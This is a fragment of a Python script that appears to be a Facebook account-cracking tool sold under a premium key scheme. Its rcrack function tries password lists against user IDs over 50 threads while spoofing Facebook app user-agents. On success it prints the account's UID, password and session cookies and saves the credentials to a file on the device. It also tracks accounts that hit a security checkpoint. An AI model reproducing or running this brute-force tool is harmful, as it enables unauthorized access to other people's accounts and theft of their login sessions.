...
def o():
    ...
    print("     \x1b[1;91m●\x1b[1;92m═━═━═━━═━═━═\x1b[1;91m❴\033[47m\033[1;30mMAHMUD BOSS\033[40m\033[00m\x1b[1;91m❵\x1b[1;92m═━═━═━━═━═\x1b[1;91m●--")
    ...
    MAHMUD = input('     \033[97;1m[\033[92;1m?\033[97;1m] \033[97;1mSelect menu \033[38;5;196m: ')
    if MAHMUD == '1':
        i()
    if MAHMUD == '2':
...
header_grup = {"user-agent": "Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
Afridi2=requests.get("https://github.com/MAHMUD-cyber99487/MAHMUD-ok-id/blob/main/Approved.txt").text
header_grup = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109"}
header_grup = {"user-agent": "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0; Touch"}
header_grup = {"user-agent": "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/7.0; TNJB; 1ButtonTaskbar"}
header_grup = {"user-agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0"}
er=requests.get("https://github.com/MAHMUD-cyber99487/MAHMUD-ok-id/blob/main/Approved.txt").text
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 4.0.4; BNTV400 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 4.4.2; SM-T237P Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 4.4.2; SM-T530NU Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36"}
header_grup = {"user-agent": "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.2.15 Version/10.00"}
...
def i():
    ...
    with ThreadPool(max_workers=50) as setu:
        ...
        print('     \033[97;1m[\033[92;1m+\033[97;1m] \033[93;1mFILE SAVE \033[38;5;196m: \033[38;5;46mMAHMUD-EHC-OK.txt')
        print('     \033[97;1m[\033[92;1m+\033[97;1m] \033[93;1mFILE SAVE \033[38;5;196m: \033[38;5;196mMAHMUD-EHC-CP.txt')
        print("     \x1b[1;91m●\x1b[1;92m═━═━═━━═━═━═\x1b[1;91m❴\033[47m\033[1;30mMAHMUD BOSS\033[40m\033[00m\x1b[1;91m❵\x1b[1;92m═━═━═━━═━═\x1b[1;91m●--")
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
           ...
           'user-agent': 'Mozilla/5.0 (Android; Mobile; rv:115.0) Gecko/115.0 Firefox/115.0',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print('\033[38;5;46m[MAHMUD-OK] ' +uid+ '|' +ps+    '  \n   \033[38;5;46mCOOKIES : \033[38;5;46m'+coki+ ' ')                
                open('/sdcard/MAHMUD-EHC-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                #print('\033[38;5;46m[MAHMUD-CP] ' +uid+ '|' +ps+ '  \33[0;97m')
                #open('/sdcard/MAHMUD-EHC-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        brand=random.choice(['MAHMUD CYBER','MAHMUD-CYBER ','MAHMUD CRACK '])
        ...
        sys.stdout.flush()
        sys.stdout.write('\r    \33[1;93m[\033[1;95mMAHMUD\033[0m/%s\33[1;93m]\033[1;97mOK-\033[38;5;46m%s'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
#___________❦❦❦❦❦❦❦❦❦❦❦❦❦❦❦❦❦❦
...
def Subscraption():
	...
	if key1 in r1:
		...
		print("    \033[97;1m[\033[92;1m•\033[97;1m]\33[0;92mYour Key  :\033[1;94m "+ak+MAHMUD+key1)
		...
		time.sleep(3.5)
		tks = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+MAHMUD+''+key1
...
#________𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊__𝐄𝐌𝐑𝐀𝐍_𝐇𝐎𝐒𝐒𝐀𝐈𝐍❦
#__________𝐆𝐈𝐓𝐇𝐔𝐁_______𝐌𝐀𝐗_𝐌𝐀𝐍_𝐅𝐑𝐎❦
#_________𝐅𝐑𝐎𝐌____________𝐁𝐀𝐍𝐆𝐋𝐀𝐃𝐄??𝐇❦
#___(((𝐏𝐀𝐈𝐃_𝐕𝐈𝐏__𝐒𝐄)))_𝐋𝐎𝐕𝐄_𝐌𝐔𝐍𝐌𝐔𝐍__❦
#___________❦❦❦❦❦❦❦❦❦❦❦❦❦❦❦❦❦❦❦❦❦